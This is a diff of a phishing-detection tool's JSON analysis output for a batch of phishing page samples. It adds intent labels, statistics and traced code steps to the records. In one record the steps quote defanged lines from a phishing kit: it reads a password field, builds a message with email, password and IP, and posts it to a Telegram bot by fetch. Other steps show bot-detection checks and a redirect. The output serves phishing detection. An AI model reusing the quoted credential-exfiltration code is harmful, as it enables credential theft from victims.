@@ -1,9 +1,9 @@
 {
  "68": {
-  "analysis_id": "44f73645f96f47fb8eeefecfbc4a564b",
+  "analysis_id": "92d5350e10334e71829d2091572ac8e9",
   "request_id": "c2_phishing_000115",
   "schema_version": "c2.analysis.v1",
-  "analyzed_at": "2026-10-18T00:02:15.049168+05:30",
+  "analyzed_at": "2026-10-21T08:26:23.802676+05:30",
   "source": "threatradar",
   "cached": false,
   "input": {
@@ -86,7 +86,10 @@
       },
       "fusion_weight": 0.1
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": null,
+    "stats": {}
    },
    "content": {
     "status": "ok",
@@ -126,7 +129,17 @@
       },
       "fusion_weight": 0.4
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "cue-word matches of the intent taxonomy (preliminary; intent model pending, Part 6B)",
+    "stats": {
+     "segments": 263.0,
+     "page_text_chars": 2999.0,
+     "language_confidence": 0.7172,
+     "si_script_ratio": 0.0,
+     "ta_script_ratio": 0.0,
+     "latin_script_ratio": 0.9998
+    }
    },
    "behavior": {
     "status": "ok",
@@ -149,7 +162,19 @@
       },
       "fusion_weight": 0.3
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "static AST source->sink patterns (Part 8, never executed)",
+    "stats": {
+     "scripts_analyzed": 1.0,
+     "scripts_lexical": 0.0,
+     "library_scripts_skipped": 0.0,
+     "sources_total": 0.0,
+     "sinks_total": 0.0,
+     "flows_total": 0.0,
+     "flows_external": 0.0,
+     "behavior_risk_score": 0.0
+    }
    }
   },
   "explanation": {
@@ -229,24 +254,24 @@
    "verdict_thresholds": "2026-10-17T21:04:36+05:30"
   },
   "timings_ms": {
-   "preprocess": 68.0,
-   "quality": 31.5,
-   "dom_features": 33.6,
-   "dom_model": 23.0,
-   "content": 38.3,
-   "text_models": 359.5,
-   "js_analysis": 1.5,
-   "behavior": 0.8,
-   "behavior_model": 34.2,
+   "preprocess": 54.3,
+   "quality": 38.5,
+   "dom_features": 34.0,
+   "dom_model": 23.5,
+   "content": 44.6,
+   "text_models": 374.4,
+   "js_analysis": 1.3,
+   "behavior": 0.7,
+   "behavior_model": 32.8,
    "fusion": 0.1,
-   "total": 592.0
+   "total": 624.7
   }
  },
  "67": {
-  "analysis_id": "a2471bdc2379476c8e3c50feec27200c",
+  "analysis_id": "ab0377bb0c994363be4e8832f6b00447",
   "request_id": "c2_phishing_000106",
   "schema_version": "c2.analysis.v1",
-  "analyzed_at": "2026-10-18T00:02:14.436464+05:30",
+  "analyzed_at": "2026-10-21T08:26:23.162634+05:30",
   "source": "threatradar",
   "cached": false,
   "input": {
@@ -319,7 +344,10 @@
       },
       "fusion_weight": 0.1
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": null,
+    "stats": {}
    },
    "content": {
     "status": "ok",
@@ -357,7 +385,17 @@
       },
       "fusion_weight": 0.4
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "cue-word matches of the intent taxonomy (preliminary; intent model pending, Part 6B)",
+    "stats": {
+     "segments": 29.0,
+     "page_text_chars": 848.0,
+     "language_confidence": 0.8814,
+     "si_script_ratio": 0.0,
+     "ta_script_ratio": 0.0,
+     "latin_script_ratio": 1.0
+    }
    },
    "behavior": {
     "status": "ok",
@@ -380,7 +418,19 @@
       },
       "fusion_weight": 0.3
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "static AST source->sink patterns (Part 8, never executed)",
+    "stats": {
+     "scripts_analyzed": 4.0,
+     "scripts_lexical": 0.0,
+     "library_scripts_skipped": 1.0,
+     "sources_total": 0.0,
+     "sinks_total": 2.0,
+     "flows_total": 0.0,
+     "flows_external": 0.0,
+     "behavior_risk_score": 0.0
+    }
    }
   },
   "explanation": {
@@ -460,24 +510,24 @@
    "verdict_thresholds": "2026-10-17T21:04:36+05:30"
   },
   "timings_ms": {
-   "preprocess": 18.2,
-   "quality": 11.6,
-   "dom_features": 12.3,
-   "dom_model": 29.4,
-   "content": 9.7,
-   "text_models": 175.8,
-   "js_analysis": 5.9,
-   "behavior": 4.5,
-   "behavior_model": 33.9,
+   "preprocess": 19.6,
+   "quality": 12.8,
+   "dom_features": 13.1,
+   "dom_model": 27.8,
+   "content": 7.2,
+   "text_models": 183.6,
+   "js_analysis": 5.7,
+   "behavior": 5.6,
+   "behavior_model": 29.3,
    "fusion": 0.1,
-   "total": 302.1
+   "total": 307.9
   }
  },
  "66": {
-  "analysis_id": "30c112ab40c44076a6fd1a30139c2b29",
+  "analysis_id": "74c2d4d87cbf43ac89a2d0f3f3614921",
   "request_id": "c2_phishing_000103",
   "schema_version": "c2.analysis.v1",
-  "analyzed_at": "2026-10-18T00:02:14.111990+05:30",
+  "analyzed_at": "2026-10-21T08:26:22.829637+05:30",
   "source": "threatradar",
   "cached": false,
   "input": {
@@ -582,7 +632,10 @@
       },
       "fusion_weight": 0.1
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": null,
+    "stats": {}
    },
    "content": {
     "status": "ok",
@@ -622,7 +675,17 @@
       },
       "fusion_weight": 0.4
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "cue-word matches of the intent taxonomy (preliminary; intent model pending, Part 6B)",
+    "stats": {
+     "segments": 17.0,
+     "page_text_chars": 703.0,
+     "language_confidence": 0.7878,
+     "si_script_ratio": 0.0,
+     "ta_script_ratio": 0.0,
+     "latin_script_ratio": 0.9247
+    }
    },
    "behavior": {
     "status": "ok",
@@ -645,7 +708,19 @@
       },
       "fusion_weight": 0.3
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "static AST source->sink patterns (Part 8, never executed)",
+    "stats": {
+     "scripts_analyzed": 163.0,
+     "scripts_lexical": 0.0,
+     "library_scripts_skipped": 1.0,
+     "sources_total": 3.0,
+     "sinks_total": 8.0,
+     "flows_total": 2.0,
+     "flows_external": 0.0,
+     "behavior_risk_score": 0.0
+    }
    }
   },
   "explanation": {
@@ -725,24 +800,24 @@
    "verdict_thresholds": "2026-10-17T21:04:36+05:30"
   },
   "timings_ms": {
-   "preprocess": 31.8,
-   "quality": 15.4,
-   "dom_features": 10.4,
-   "dom_model": 28.6,
-   "content": 8.7,
-   "text_models": 153.5,
-   "js_analysis": 33.9,
-   "behavior": 25.1,
-   "behavior_model": 34.1,
+   "preprocess": 32.3,
+   "quality": 23.3,
+   "dom_features": 13.2,
+   "dom_model": 24.8,
+   "content": 9.0,
+   "text_models": 158.8,
+   "js_analysis": 32.7,
+   "behavior": 31.6,
+   "behavior_model": 46.0,
    "fusion": 0.1,
-   "total": 342.5
+   "total": 376.2
   }
  },
  "65": {
-  "analysis_id": "1b56706fb0894c5da6bb30d239e82a0d",
+  "analysis_id": "4961e4179a2e4f3c82e8895ecfcd26a6",
   "request_id": "c2_phishing_000095",
   "schema_version": "c2.analysis.v1",
-  "analyzed_at": "2026-10-18T00:02:13.747369+05:30",
+  "analyzed_at": "2026-10-21T08:26:22.429389+05:30",
   "source": "threatradar",
   "cached": false,
   "input": {
@@ -857,7 +932,10 @@
       },
       "fusion_weight": 0.1
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": null,
+    "stats": {}
    },
    "content": {
     "status": "ok",
@@ -897,7 +975,17 @@
       },
       "fusion_weight": 0.4
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "cue-word matches of the intent taxonomy (preliminary; intent model pending, Part 6B)",
+    "stats": {
+     "segments": 7.0,
+     "page_text_chars": 178.0,
+     "language_confidence": 0.8191,
+     "si_script_ratio": 0.0,
+     "ta_script_ratio": 0.0,
+     "latin_script_ratio": 1.0
+    }
    },
    "behavior": {
     "status": "ok",
@@ -920,7 +1008,19 @@
       },
       "fusion_weight": 0.3
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "static AST source->sink patterns (Part 8, never executed)",
+    "stats": {
+     "scripts_analyzed": 178.0,
+     "scripts_lexical": 0.0,
+     "library_scripts_skipped": 0.0,
+     "sources_total": 2.0,
+     "sinks_total": 3.0,
+     "flows_total": 2.0,
+     "flows_external": 0.0,
+     "behavior_risk_score": 0.0
+    }
    }
   },
   "explanation": {
@@ -1000,24 +1100,24 @@
    "verdict_thresholds": "2026-10-17T21:04:36+05:30"
   },
   "timings_ms": {
-   "preprocess": 23.2,
-   "quality": 9.9,
-   "dom_features": 6.1,
-   "dom_model": 24.1,
-   "content": 9.7,
-   "text_models": 61.7,
-   "js_analysis": 33.2,
-   "behavior": 25.7,
-   "behavior_model": 32.8,
+   "preprocess": 19.4,
+   "quality": 10.0,
+   "dom_features": 6.4,
+   "dom_model": 22.9,
+   "content": 9.2,
+   "text_models": 87.9,
+   "js_analysis": 35.2,
+   "behavior": 28.0,
+   "behavior_model": 35.0,
    "fusion": 0.1,
-   "total": 227.4
+   "total": 256.5
   }
  },
  "64": {
-  "analysis_id": "5e20efd295cd48819ea512e3af662c07",
+  "analysis_id": "2c2756452689439f9de646ca5609a0eb",
   "request_id": "c2_phishing_000093",
   "schema_version": "c2.analysis.v1",
-  "analyzed_at": "2026-10-18T00:02:13.497533+05:30",
+  "analyzed_at": "2026-10-21T08:26:22.149924+05:30",
   "source": "threatradar",
   "cached": false,
   "input": {
@@ -1100,7 +1200,10 @@
       },
       "fusion_weight": 0.1
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": null,
+    "stats": {}
    },
    "content": {
     "status": "ok",
@@ -1140,7 +1243,17 @@
       },
       "fusion_weight": 0.4
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "cue-word matches of the intent taxonomy (preliminary; intent model pending, Part 6B)",
+    "stats": {
+     "segments": 9.0,
+     "page_text_chars": 210.0,
+     "language_confidence": 0.6638,
+     "si_script_ratio": 0.0,
+     "ta_script_ratio": 0.0,
+     "latin_script_ratio": 0.9209
+    }
    },
    "behavior": {
     "status": "ok",
@@ -1163,7 +1276,19 @@
       },
       "fusion_weight": 0.3
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "static AST source->sink patterns (Part 8, never executed)",
+    "stats": {
+     "scripts_analyzed": 24.0,
+     "scripts_lexical": 0.0,
+     "library_scripts_skipped": 0.0,
+     "sources_total": 3.0,
+     "sinks_total": 1.0,
+     "flows_total": 0.0,
+     "flows_external": 0.0,
+     "behavior_risk_score": 0.0
+    }
    }
   },
   "explanation": {
@@ -1243,24 +1368,24 @@
    "verdict_thresholds": "2026-10-17T21:04:36+05:30"
   },
   "timings_ms": {
-   "preprocess": 16.7,
-   "quality": 17.2,
-   "dom_features": 9.9,
-   "dom_model": 36.5,
-   "content": 9.7,
-   "text_models": 66.6,
-   "js_analysis": 59.7,
-   "behavior": 66.5,
-   "behavior_model": 32.8,
+   "preprocess": 18.6,
+   "quality": 16.5,
+   "dom_features": 10.0,
+   "dom_model": 35.6,
+   "content": 9.6,
+   "text_models": 72.4,
+   "js_analysis": 59.6,
+   "behavior": 69.5,
+   "behavior_model": 34.9,
    "fusion": 0.1,
-   "total": 316.8
+   "total": 329.7
   }
  },
  "63": {
-  "analysis_id": "147d46ca1cf54416ab8afa8df041f220",
+  "analysis_id": "47239cc447a542ee88408ac89566994e",
   "request_id": "c2_phishing_000071",
   "schema_version": "c2.analysis.v1",
-  "analyzed_at": "2026-10-18T00:02:13.157406+05:30",
+  "analyzed_at": "2026-10-21T08:26:21.794693+05:30",
   "source": "threatradar",
   "cached": false,
   "input": {
@@ -1353,7 +1478,10 @@
       },
       "fusion_weight": 0.1
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": null,
+    "stats": {}
    },
    "content": {
     "status": "ok",
@@ -1394,7 +1522,41 @@
       },
       "fusion_weight": 0.4
      }
-    ]
+    ],
+    "intents": [
+     {
+      "intent": "credential_request",
+      "display": "credential request",
+      "method": "cue_words",
+      "severity": null,
+      "count": 4,
+      "cues": [
+       "verification code",
+       "update your password"
+      ],
+      "example": "Enable Two-Factor Authentication If you have 2FA enabled, enter the verification code from your authenticator app. This step adds extra protection to your acco…"
+     },
+     {
+      "intent": "fake_security_warning",
+      "display": "fake security warning",
+      "method": "cue_words",
+      "severity": null,
+      "count": 2,
+      "cues": [
+       "unauthorized access"
+      ],
+      "example": "Always Use 2FA: This step drastically reduces the chances of unauthorized access."
+     }
+    ],
+    "intent_method": "cue-word matches of the intent taxonomy (preliminary; intent model pending, Part 6B)",
+    "stats": {
+     "segments": 39.0,
+     "page_text_chars": 2995.0,
+     "language_confidence": 0.841,
+     "si_script_ratio": 0.0,
+     "ta_script_ratio": 0.0,
+     "latin_script_ratio": 1.0
+    }
    },
    "behavior": {
     "status": "ok",
@@ -1417,7 +1579,19 @@
       },
       "fusion_weight": 0.3
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "static AST source->sink patterns (Part 8, never executed)",
+    "stats": {
+     "scripts_analyzed": 0.0,
+     "scripts_lexical": 0.0,
+     "library_scripts_skipped": 0.0,
+     "sources_total": 0.0,
+     "sinks_total": 0.0,
+     "flows_total": 0.0,
+     "flows_external": 0.0,
+     "behavior_risk_score": 0.0
+    }
    }
   },
   "explanation": {
@@ -1497,24 +1671,24 @@
    "verdict_thresholds": "2026-10-17T21:04:36+05:30"
   },
   "timings_ms": {
-   "preprocess": 12.6,
-   "quality": 11.1,
-   "dom_features": 6.2,
-   "dom_model": 44.5,
-   "content": 16.8,
-   "text_models": 350.5,
-   "js_analysis": 0.8,
+   "preprocess": 12.1,
+   "quality": 10.9,
+   "dom_features": 6.7,
+   "dom_model": 52.1,
+   "content": 18.9,
+   "text_models": 382.3,
+   "js_analysis": 0.7,
    "behavior": 0.2,
-   "behavior_model": 32.4,
+   "behavior_model": 31.9,
    "fusion": 0.1,
-   "total": 476.2
+   "total": 533.0
   }
  },
  "62": {
-  "analysis_id": "a61b27d8c59a4e96bc864a28bb5d6a27",
+  "analysis_id": "db65301db88b4692a23be66e6b28f865",
   "request_id": "c2_phishing_000063",
   "schema_version": "c2.analysis.v1",
-  "analyzed_at": "2026-10-18T00:02:12.657501+05:30",
+  "analyzed_at": "2026-10-21T08:26:21.238478+05:30",
   "source": "threatradar",
   "cached": false,
   "input": {
@@ -1548,7 +1722,38 @@
     "detail": "Sends credentials (#password) to Telegram Bot API (telegram[.]org, fetch, line 166).",
     "evidence": "passwordInput.value",
     "raises_verdict": true,
-    "steps": []
+    "steps": [
+     {
+      "kind": "flow_step",
+      "line": 110,
+      "code": "passwordInput.value",
+      "note": "source: #password = password field"
+     },
+     {
+      "kind": "flow_step",
+      "line": 110,
+      "code": "password = passwordInput.value",
+      "note": "assign: password"
+     },
+     {
+      "kind": "flow_step",
+      "line": 113,
+      "code": "sendToTelegram(email, password, userIP)",
+      "note": "call: argument 2 -› password of sendToTelegram()"
+     },
+     {
+      "kind": "flow_step",
+      "line": 159,
+      "code": "message = `New login attempt: Email: ${email} Password: ${password} IP Address: ${ip} User Agent: ${navigator.userAge...",
+      "note": "concat: message"
+     },
+     {
+      "kind": "flow_step",
+      "line": 166,
+      "code": "fetch(`hxxps://api[.]telegram[.]org/bot${botToken}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'applicatio...",
+      "note": "sink: fetch -› Telegram Bot API (telegram[.]org)"
+     }
+    ]
    },
    {
     "id": "behavior.forced_redirect.automatic",
@@ -1558,7 +1763,26 @@
     "detail": "Redirects to wikipedia[.]org without any user action (immediately invoked; top-level script code (runs on page load); line 13).",
     "evidence": "navigator.userAgent",
     "raises_verdict": false,
-    "steps": []
+    "steps": [
+     {
+      "kind": "source",
+      "line": 3,
+      "code": "navigator.userAgent",
+      "note": "check: navigator.userAgent"
+     },
+     {
+      "kind": "source",
+      "line": 5,
+      "code": "navigator.webdriver",
+      "note": "check: navigator.webdriver"
+     },
+     {
+      "kind": "sink",
+      "line": 13,
+      "code": "window.location.href = \"hxxps://www[.]wikipedia[.]org\"",
+      "note": "redirect_external: location.href (immediately invoked; top-level script code (r…"
+     }
+    ]
    },
    {
     "id": "behavior.forced_redirect.automatic",
@@ -1568,7 +1792,26 @@
     "detail": "Redirects to wikipedia[.]org without any user action (immediately invoked; top-level script code (runs on page load); line 27).",
     "evidence": "navigator.userAgent",
     "raises_verdict": false,
-    "steps": []
+    "steps": [
+     {
+      "kind": "source",
+      "line": 3,
+      "code": "navigator.userAgent",
+      "note": "check: navigator.userAgent"
+     },
+     {
+      "kind": "source",
+      "line": 5,
+      "code": "navigator.webdriver",
+      "note": "check: navigator.webdriver"
+     },
+     {
+      "kind": "sink",
+      "line": 27,
+      "code": "window.location.href = \"hxxps://www[.]wikipedia[.]org\"",
+      "note": "redirect_external: location.href (immediately invoked; top-level script code (r…"
+     }
+    ]
    },
    {
     "id": "fusion.verdict",
@@ -1638,7 +1881,14 @@
     "detail": "Page code reads 1 credential field value(s) (#password).",
     "evidence": "passwordInput.value",
     "raises_verdict": false,
-    "steps": []
+    "steps": [
+     {
+      "kind": "source",
+      "line": 110,
+      "code": "passwordInput.value",
+      "note": "credential_input: #password = password field"
+     }
+    ]
    }
   ],
   "findings_total": 12,
@@ -1669,7 +1919,10 @@
       },
       "fusion_weight": 0.1
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": null,
+    "stats": {}
    },
    "content": {
     "status": "ok",
@@ -1709,7 +1962,29 @@
       },
       "fusion_weight": 0.4
      }
-    ]
+    ],
+    "intents": [
+     {
+      "intent": "credential_request",
+      "display": "credential request",
+      "method": "cue_words",
+      "severity": null,
+      "count": 1,
+      "cues": [
+       "enter your password"
+      ],
+      "example": "Enter your password"
+     }
+    ],
+    "intent_method": "cue-word matches of the intent taxonomy (preliminary; intent model pending, Part 6B)",
+    "stats": {
+     "segments": 8.0,
+     "page_text_chars": 174.0,
+     "language_confidence": 0.8639,
+     "si_script_ratio": 0.0,
+     "ta_script_ratio": 0.0,
+     "latin_script_ratio": 1.0
+    }
    },
    "behavior": {
     "status": "ok",
@@ -1736,7 +2011,56 @@
       },
       "fusion_weight": 0.3
      }
-    ]
+    ],
+    "intents": [
+     {
+      "intent": "credential_exfiltration",
+      "display": "Credential exfiltration",
+      "method": "ast_source_sink",
+      "severity": "critical",
+      "count": 1,
+      "cues": [],
+      "example": "Sends credentials (#password) to Telegram Bot API (telegram[.]org, fetch, line 166)."
+     },
+     {
+      "intent": "forced_redirect",
+      "display": "Forced redirect",
+      "method": "ast_source_sink",
+      "severity": "high",
+      "count": 2,
+      "cues": [],
+      "example": "Redirects to wikipedia[.]org without any user action (immediately invoked; top-level script code (runs on page load); line 13)."
+     },
+     {
+      "intent": "credential_access",
+      "display": "Credential access",
+      "method": "ast_source_sink",
+      "severity": "low",
+      "count": 1,
+      "cues": [],
+      "example": "Page code reads 1 credential field value(s) (#password)."
+     },
+     {
+      "intent": "external_data_transmission",
+      "display": "External data transmission",
+      "method": "ast_source_sink",
+      "severity": "low",
+      "count": 2,
+      "cues": [],
+      "example": "Sends browser fingerprint data (navigator.userAgent) to Telegram Bot API (telegram[.]org) (fetch, line 166)."
+     }
+    ],
+    "intent_method": "static AST source->sink patterns (Part 8, never executed)",
+    "stats": {
+     "scripts_analyzed": 3.0,
+     "scripts_lexical": 0.0,
+     "library_scripts_skipped": 0.0,
+     "sources_total": 12.0,
+     "sinks_total": 7.0,
+     "flows_total": 5.0,
+     "flows_external": 3.0,
+     "behavior_risk_score": 81.0
+    }
    }
   },
   "explanation": {
@@ -1818,24 +2142,24 @@
    "verdict_thresholds": "2026-10-17T21:04:36+05:30"
   },
   "timings_ms": {
-   "preprocess": 4.5,
-   "quality": 2.9,
+   "preprocess": 4.8,
+   "quality": 3.0,
    "dom_features": 2.5,
-   "dom_model": 51.0,
-   "content": 3.1,
-   "text_models": 65.4,
-   "js_analysis": 10.8,
-   "behavior": 17.8,
-   "behavior_model": 34.3,
+   "dom_model": 44.7,
+   "content": 2.2,
+   "text_models": 61.9,
+   "js_analysis": 8.9,
+   "behavior": 18.9,
+   "behavior_model": 34.6,
    "fusion": 0.1,
-   "total": 193.5
+   "total": 184.6
   }
  },
  "61": {
-  "analysis_id": "131a9ae9cb364aa383b0ea4faa5b95cc",
+  "analysis_id": "5d95a75277544ad7aec6c7bbeecd85e2",
   "request_id": "c2_phishing_000048",
   "schema_version": "c2.analysis.v1",
-  "analyzed_at": "2026-10-18T00:02:12.441113+05:30",
+  "analyzed_at": "2026-10-21T08:26:21.028932+05:30",
   "source": "threatradar",
   "cached": false,
   "input": {
@@ -1960,7 +2284,10 @@
       },
       "fusion_weight": 0.1
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": null,
+    "stats": {}
    },
    "content": {
     "status": "ok",
@@ -2000,7 +2327,31 @@
       },
       "fusion_weight": 0.4
      }
-    ]
+    ],
+    "intents": [
+     {
+      "intent": "credential_request",
+      "display": "credential request",
+      "method": "cue_words",
+      "severity": null,
+      "count": 3,
+      "cues": [
+       "card number",
+       "expiration month",
+       "cvv"
+      ],
+      "example": "Card number:"
+     }
+    ],
+    "intent_method": "cue-word matches of the intent taxonomy (preliminary; intent model pending, Part 6B)",
+    "stats": {
+     "segments": 34.0,
+     "page_text_chars": 1270.0,
+     "language_confidence": 0.8234,
+     "si_script_ratio": 0.0,
+     "ta_script_ratio": 0.0,
+     "latin_script_ratio": 1.0
+    }
    },
    "behavior": {
     "status": "ok",
@@ -2023,7 +2374,19 @@
       },
       "fusion_weight": 0.3
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "static AST source->sink patterns (Part 8, never executed)",
+    "stats": {
+     "scripts_analyzed": 1.0,
+     "scripts_lexical": 0.0,
+     "library_scripts_skipped": 0.0,
+     "sources_total": 0.0,
+     "sinks_total": 3.0,
+     "flows_total": 0.0,
+     "flows_external": 0.0,
+     "behavior_risk_score": 0.0
+    }
    }
   },
   "explanation": {
@@ -2103,24 +2466,24 @@
    "verdict_thresholds": "2026-10-17T21:04:36+05:30"
   },
   "timings_ms": {
-   "preprocess": 10.5,
-   "quality": 7.7,
-   "dom_features": 5.9,
-   "dom_model": 35.0,
-   "content": 7.6,
-   "text_models": 261.5,
-   "js_analysis": 1.5,
-   "behavior": 1.0,
-   "behavior_model": 34.0,
+   "preprocess": 6.7,
+   "quality": 4.4,
+   "dom_features": 2.8,
+   "dom_model": 33.8,
+   "content": 7.9,
+   "text_models": 253.6,
+   "js_analysis": 1.4,
+   "behavior": 0.9,
+   "behavior_model": 35.2,
    "fusion": 0.1,
-   "total": 365.6
+   "total": 351.7
   }
  },
  "60": {
-  "analysis_id": "54fb483e2d054705a9728e61b490c27d",
+  "analysis_id": "0469731501a1479d8bc5683ed94d7ed5",
   "request_id": "c2_phishing_000046",
   "schema_version": "c2.analysis.v1",
-  "analyzed_at": "2026-10-18T00:02:12.053688+05:30",
+  "analyzed_at": "2026-10-21T08:26:20.657984+05:30",
   "source": "threatradar",
   "cached": false,
   "input": {
@@ -2214,7 +2577,10 @@
       },
       "fusion_weight": 0.1
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": null,
+    "stats": {}
    },
    "content": {
     "status": "ok",
@@ -2254,7 +2620,17 @@
       },
       "fusion_weight": 0.4
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "cue-word matches of the intent taxonomy (preliminary; intent model pending, Part 6B)",
+    "stats": {
+     "segments": 22.0,
+     "page_text_chars": 878.0,
+     "language_confidence": 0.8229,
+     "si_script_ratio": 0.0,
+     "ta_script_ratio": 0.0,
+     "latin_script_ratio": 1.0
+    }
    },
    "behavior": {
     "status": "ok",
@@ -2277,7 +2653,19 @@
       },
       "fusion_weight": 0.3
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "static AST source->sink patterns (Part 8, never executed)",
+    "stats": {
+     "scripts_analyzed": 2.0,
+     "scripts_lexical": 0.0,
+     "library_scripts_skipped": 0.0,
+     "sources_total": 2.0,
+     "sinks_total": 2.0,
+     "flows_total": 0.0,
+     "flows_external": 0.0,
+     "behavior_risk_score": 0.0
+    }
    }
   },
   "explanation": {
@@ -2357,24 +2745,24 @@
    "verdict_thresholds": "2026-10-17T21:04:36+05:30"
   },
   "timings_ms": {
-   "preprocess": 11.8,
-   "quality": 4.1,
-   "dom_features": 3.1,
-   "dom_model": 33.2,
-   "content": 9.9,
-   "text_models": 179.5,
-   "js_analysis": 3.8,
-   "behavior": 2.9,
-   "behavior_model": 33.5,
+   "preprocess": 10.7,
+   "quality": 4.0,
+   "dom_features": 3.5,
+   "dom_model": 33.1,
+   "content": 7.6,
+   "text_models": 176.3,
+   "js_analysis": 4.0,
+   "behavior": 3.5,
+   "behavior_model": 34.6,
    "fusion": 0.1,
-   "total": 282.6
+   "total": 281.3
   }
  },
  "59": {
-  "analysis_id": "b1a71d03875541539ee2a7ba18c0a555",
+  "analysis_id": "19b5ff458a74458d89a4d637c777353a",
   "request_id": "c2_phishing_000040",
   "schema_version": "c2.analysis.v1",
-  "analyzed_at": "2026-10-18T00:02:11.749133+05:30",
+  "analyzed_at": "2026-10-21T08:26:20.361939+05:30",
   "source": "threatradar",
   "cached": false,
   "input": {
@@ -2468,7 +2856,10 @@
       },
       "fusion_weight": 0.1
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": null,
+    "stats": {}
    },
    "content": {
     "status": "ok",
@@ -2508,7 +2899,17 @@
       },
       "fusion_weight": 0.4
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "cue-word matches of the intent taxonomy (preliminary; intent model pending, Part 6B)",
+    "stats": {
+     "segments": 17.0,
+     "page_text_chars": 524.0,
+     "language_confidence": 0.8167,
+     "si_script_ratio": 0.0,
+     "ta_script_ratio": 0.0,
+     "latin_script_ratio": 1.0
+    }
    },
    "behavior": {
     "status": "ok",
@@ -2531,7 +2932,19 @@
       },
       "fusion_weight": 0.3
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "static AST source->sink patterns (Part 8, never executed)",
+    "stats": {
+     "scripts_analyzed": 2.0,
+     "scripts_lexical": 0.0,
+     "library_scripts_skipped": 0.0,
+     "sources_total": 0.0,
+     "sinks_total": 3.0,
+     "flows_total": 0.0,
+     "flows_external": 0.0,
+     "behavior_risk_score": 0.0
+    }
    }
   },
   "explanation": {
@@ -2611,24 +3024,24 @@
    "verdict_thresholds": "2026-10-17T21:04:36+05:30"
   },
   "timings_ms": {
-   "preprocess": 14.4,
-   "quality": 9.8,
-   "dom_features": 8.2,
-   "dom_model": 43.0,
-   "content": 7.4,
-   "text_models": 128.0,
-   "js_analysis": 6.8,
-   "behavior": 3.4,
-   "behavior_model": 32.1,
+   "preprocess": 8.5,
+   "quality": 6.8,
+   "dom_features": 4.6,
+   "dom_model": 32.6,
+   "content": 7.3,
+   "text_models": 127.9,
+   "js_analysis": 6.2,
+   "behavior": 4.8,
+   "behavior_model": 33.4,
    "fusion": 0.1,
-   "total": 254.2
+   "total": 235.4
   }
  },
  "58": {
-  "analysis_id": "25600b0922ba4fa9a98bee505b4935f2",
+  "analysis_id": "016b382ca3aa488fa92bdca5573d399f",
   "request_id": "c2_phishing_000031",
   "schema_version": "c2.analysis.v1",
-  "analyzed_at": "2026-10-18T00:02:11.471954+05:30",
+  "analyzed_at": "2026-10-21T08:26:20.109943+05:30",
   "source": "threatradar",
   "cached": false,
   "input": {
@@ -2711,7 +3124,10 @@
       },
       "fusion_weight": 0.1
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": null,
+    "stats": {}
    },
    "content": {
     "status": "ok",
@@ -2751,7 +3167,17 @@
       },
       "fusion_weight": 0.4
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "cue-word matches of the intent taxonomy (preliminary; intent model pending, Part 6B)",
+    "stats": {
+     "segments": 230.0,
+     "page_text_chars": 2997.0,
+     "language_confidence": 0.7131,
+     "si_script_ratio": 0.0,
+     "ta_script_ratio": 0.0,
+     "latin_script_ratio": 0.9998
+    }
    },
    "behavior": {
     "status": "ok",
@@ -2774,7 +3200,19 @@
       },
       "fusion_weight": 0.3
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "static AST source->sink patterns (Part 8, never executed)",
+    "stats": {
+     "scripts_analyzed": 1.0,
+     "scripts_lexical": 0.0,
+     "library_scripts_skipped": 0.0,
+     "sources_total": 0.0,
+     "sinks_total": 0.0,
+     "flows_total": 0.0,
+     "flows_external": 0.0,
+     "behavior_risk_score": 0.0
+    }
    }
   },
   "explanation": {
@@ -2854,24 +3292,24 @@
    "verdict_thresholds": "2026-10-17T21:04:36+05:30"
   },
   "timings_ms": {
-   "preprocess": 73.7,
-   "quality": 33.8,
-   "dom_features": 29.5,
-   "dom_model": 23.3,
-   "content": 36.4,
-   "text_models": 370.6,
-   "js_analysis": 2.0,
-   "behavior": 1.1,
-   "behavior_model": 35.0,
+   "preprocess": 75.8,
+   "quality": 35.3,
+   "dom_features": 26.3,
+   "dom_model": 22.6,
+   "content": 49.2,
+   "text_models": 352.8,
+   "js_analysis": 1.6,
+   "behavior": 0.9,
+   "behavior_model": 33.8,
    "fusion": 0.1,
-   "total": 607.2
+   "total": 620.0
   }
  },
  "57": {
-  "analysis_id": "fb3e8958aff4424da2f270281fc4f296",
+  "analysis_id": "539e502b68ed439d9e9ac8158909af31",
   "request_id": "c2_phishing_000015",
   "schema_version": "c2.analysis.v1",
-  "analyzed_at": "2026-10-18T00:02:10.842631+05:30",
+  "analyzed_at": "2026-10-21T08:26:19.460667+05:30",
   "source": "threatradar",
   "cached": false,
   "input": {
@@ -2945,7 +3383,20 @@
     "detail": "Page code reads 2 credential field value(s) (#u, #p).",
     "evidence": "$(\"#u\").val()",
     "raises_verdict": false,
-    "steps": []
+    "steps": [
+     {
+      "kind": "source",
+      "line": 6,
+      "code": "$(\"#u\").val()",
+      "note": "credential_input: #u = email field"
+     },
+     {
+      "kind": "source",
+      "line": 7,
+      "code": "$(\"#p\").val()",
+      "note": "credential_input: #p = password field"
+     }
